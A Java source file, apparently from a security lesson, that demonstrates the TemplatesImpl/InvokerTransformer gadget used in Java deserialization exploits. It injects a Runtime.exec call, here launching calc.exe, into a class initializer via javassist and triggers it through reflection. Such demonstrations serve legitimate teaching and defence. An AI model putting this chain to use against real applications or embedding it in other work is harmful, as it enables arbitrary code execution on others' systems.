package edu.demo.lesson2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.lang.reflect.Field;

public class TempChain {
    public static void main(String[] arags) throws Exception{
        final byte[] byteCode = TempChain.makeByteCode();
        //set the _name for templates
        TemplatesImpl templates = new TemplatesImpl();
        Class clz = templates.getClass();
        Field field1 = clz.getDeclaredField("_name");
        field1.setAccessible(true);
        field1.set(templates, "foo");
        //set the _bytecodes[][]  for templates
        Field field2 = clz.getDeclaredField("_bytecodes");
        field2.setAccessible(true);
        field2.set(templates,new byte[][]{byteCode});
        //set the _tfactory  for templates
        Field field3 = clz.getDeclaredField("_tfactory");
        field3.setAccessible(true);
        field3.set(templates, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());
        //test 1: directly invoke
        //templates.newTransformer();
        //test2: use invokerTransformer#transformer
        InvokerTransformer invoker =  new InvokerTransformer("newTransformer",new Class[0],new Object[0]);
        invoker.transform(templates);

    }

    public static byte[] makeByteCode() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(MyTemplate.class.getName());
        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setName("NormalClass");
        return ctClass.toBytecode();
    }
}
